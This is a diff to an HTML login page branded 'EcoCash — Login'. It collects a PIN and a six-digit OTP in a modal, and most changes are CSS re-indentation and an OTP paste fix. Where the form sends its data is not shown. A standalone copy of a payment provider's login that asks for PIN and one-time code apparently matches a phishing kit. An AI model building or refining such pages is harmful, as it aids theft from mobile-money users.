@@ -1,174 +1,187 @@
 <!doctype html>
 <html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>EcoCash — Login</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>EcoCash — Login</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
-<style>
-*{box-sizing:border-box}
-html,body{height:100%}
-body{
-  font-family:Inter,system-ui,Arial;
-  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
-  margin:0;
-  padding:18px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-.card{
-  width:100%;
-  max-width:380px;
-  background:#fff;
-  padding:20px;
-  border-radius:12px;
-  box-shadow:0 12px 30px rgba(2,6,23,.06)
-}
-.logo{height:44px;display:block;margin:0 auto 10px}
-h2{text-align:center;margin:0 0 12px;font-size:20px}
-label{display:block;font-size:13px;margin-top:8px}
+  <style>
+    *{box-sizing:border-box}
+    html,body{height:100%}
 
-input{
-  width:100%;
-  padding:10px;
-  border-radius:8px;
-  border:1px solid #e6eefc;
-  background:#fbfdff;
-  font-size:14px
-}
-.btn{
-  background:#4b86ff;
-  color:#fff;
-  padding:10px;
-  border-radius:8px;
-  border:0;
-  margin-top:12px;
-  width:100%;
-  font-weight:600;
-  cursor:pointer;
-}
-.btn[disabled]{background:#cbd5e1;cursor:not-allowed}
+    body{
+      font-family:Inter,system-ui,Arial;
+      background:linear-gradient(180deg,#f7fbff,#e8f3ff);
+      margin:0;
+      padding:18px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
 
-.req{color:#d04444;margin-right:6px}
-.small{font-size:13px;color:#6b7280}
-.success{color:#16a34a;font-weight:600}
+    .card{
+      width:100%;
+      max-width:380px;
+      background:#fff;
+      padding:20px;
+      border-radius:12px;
+      box-shadow:0 12px 30px rgba(2,6,23,.06)
+    }
 
-.error{
-  min-height:18px;
-  font-size:13px;
-  color:#d04444;
-}
+    .logo{height:44px;display:block;margin:0 auto 10px}
+    h2{text-align:center;margin:0 0 12px;font-size:20px}
+    label{display:block;font-size:13px;margin-top:8px}
 
-/* PIN */
-.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
-.pin-digit{
-  width:40px;height:48px;
-  text-align:center;
-  font-size:20px;
-  border-radius:8px;
-  border:1px solid #e6eefc;
-}
+    input{
+      width:100%;
+      padding:10px;
+      border-radius:8px;
+      border:1px solid #e6eefc;
+      background:#fbfdff;
+      font-size:14px
+    }
 
-/* OTP */
-.otp-modal{
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.35);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  z-index:40;
-}
-.otp-box{
-  background:#fff;
-  padding:18px;
-  border-radius:12px;
-  min-width:300px
-}
-.otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
-.otp-digit{
-  width:40px;height:48px;
-  text-align:center;
-  font-size:20px;
-  border-radius:8px;
-  border:1px solid #e6eefc
-}
-.otp-warning{color:#d04444;font-size:13px;display:none}
+    .btn{
+      background:#4b86ff;
+      color:#fff;
+      padding:10px;
+      border-radius:8px;
+      border:0;
+      margin-top:12px;
+      width:100%;
+      font-weight:600;
+      cursor:pointer;
+    }
 
-.resend-row{
-  display:flex;
-  justify-content:space-between;
-  margin-top:12px
-}
+    .btn[disabled]{background:#cbd5e1;cursor:not-allowed}
+    .req{color:#d04444;margin-right:6px}
+    .small{font-size:13px;color:#6b7280}
+    .success{color:#16a34a;font-weight:600}
 
-.resend-btn{
-  background:#4b86ff;
-  color:#fff;
-  border:0;
-  padding:6px 12px;
-  border-radius:8px;
-  cursor:pointer;
-  font-weight:600;
-  display:flex;
-  align-items:center;
-  gap:6px;
-}
-.resend-btn[disabled]{background:#cbd5e1;cursor:not-allowed}
+    .error{
+      min-height:18px;
+      font-size:13px;
+      color:#d04444;
+    }
 
-.spinner{
-  width:14px;
-  height:14px;
-  border:2px solid rgba(255,255,255,.5);
-  border-top-color:#fff;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  display:none;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
+    /* PIN */
+    .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
+    .pin-digit{
+      width:40px;height:48px;
+      text-align:center;
+      font-size:20px;
+      border-radius:8px;
+      border:1px solid #e6eefc;
+    }
 
-.toast{
-  position:fixed;
-  bottom:20px;
-  left:50%;
-  transform:translateX(-50%);
-  background:#16a34a;
-  color:#fff;
-  padding:10px 14px;
-  border-radius:10px;
-  font-size:14px;
-  display:none;
-  z-index:60;
-}
+    /* OTP */
+    .otp-modal{
+      position:fixed;
+      inset:0;
+      background:rgba(0,0,0,.35);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      z-index:40;
+    }
 
-.otp-actions{
-  display:flex;
-  gap:10px;
-  margin-top:12px;
-}
-.otp-actions button{
-  flex:1;
-  padding:10px;
-  border-radius:8px;
-  border:0;
-  font-weight:600;
-  cursor:pointer;
-}
-#confirmOtp{
-  background:#4b86ff;
-  color:#fff;
-}
-#confirmOtp[disabled]{
-  background:#cbd5e1;
-  cursor:not-allowed;
-}
-#cancelOtp{
-  background:#e5e7eb;
-  color:#111;
-}
-</style>
+    .otp-box{
+      background:#fff;
+      padding:18px;
+      border-radius:12px;
+      min-width:300px
+    }
+
+    .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
+    .otp-digit{
+      width:40px;height:48px;
+      text-align:center;
+      font-size:20px;
+      border-radius:8px;
+      border:1px solid #e6eefc
+    }
+
+    .otp-warning{color:#d04444;font-size:13px;display:none}
+
+    .resend-row{
+      display:flex;
+      justify-content:space-between;
+      margin-top:12px
+    }
+
+    .resend-btn{
+      background:#4b86ff;
+      color:#fff;
+      border:0;
+      padding:6px 12px;
+      border-radius:8px;
+      cursor:pointer;
+      font-weight:600;
+      display:flex;
+      align-items:center;
+      gap:6px;
+    }
+
+    .resend-btn[disabled]{background:#cbd5e1;cursor:not-allowed}
+
+    .spinner{
+      width:14px;
+      height:14px;
+      border:2px solid rgba(255,255,255,.5);
+      border-top-color:#fff;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      display:none;
+    }
+
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .toast{
+      position:fixed;
+      bottom:20px;
+      left:50%;
+      transform:translateX(-50%);
+      background:#16a34a;
+      color:#fff;
+      padding:10px 14px;
+      border-radius:10px;
+      font-size:14px;
+      display:none;
+      z-index:60;
+    }
+
+    .otp-actions{
+      display:flex;
+      gap:10px;
+      margin-top:12px;
+    }
+
+    .otp-actions button{
+      flex:1;
+      padding:10px;
+      border-radius:8px;
+      border:0;
+      font-weight:600;
+      cursor:pointer;
+    }
+
+    #confirmOtp{
+      background:#4b86ff;
+      color:#fff;
+    }
+
+    #confirmOtp[disabled]{
+      background:#cbd5e1;
+      cursor:not-allowed;
+    }
+
+    #cancelOtp{
+      background:#e5e7eb;
+      color:#111;
+    }
+  </style>
 </head>
 
 <body>
@@ -191,7 +204,6 @@ input{
     </div>
 
     <input type="text" id="hp" style="display:none">
-
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
@@ -240,7 +252,10 @@ const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
 const otpWarning=document.getElementById('otpWarning');
 
-function getOtp(){return dEls.map(d=>d.value).join('');}
+function getOtp(){
+  return dEls.map(d=>d.value).join('');
+}
+
 function updateConfirm(){
   const ok=/^\d{6}$/.test(getOtp());
   confirmBtn.disabled=!ok;
@@ -254,15 +269,17 @@ dEls.forEach((d,i)=>{
     updateConfirm();
   });
 
-  /* ✅ FIXED OTP PASTE – captures ALL digits */
+  /* ✅ OTP PASTE FIX – fills all 6 boxes */
   d.addEventListener('paste',e=>{
     e.preventDefault();
+
     const pasted=(e.clipboardData||window.clipboardData)
       .getData('text')
       .replace(/\D/g,'')
       .slice(0,6);
 
     dEls.forEach(el=>el.value='');
+
     pasted.split('').forEach((digit,idx)=>{
       if(dEls[idx]) dEls[idx].value=digit;
     });
@@ -270,6 +287,7 @@ dEls.forEach((d,i)=>{
     if(pasted.length){
       dEls[Math.min(pasted.length,5)].focus();
     }
+
     updateConfirm();
   });
 });
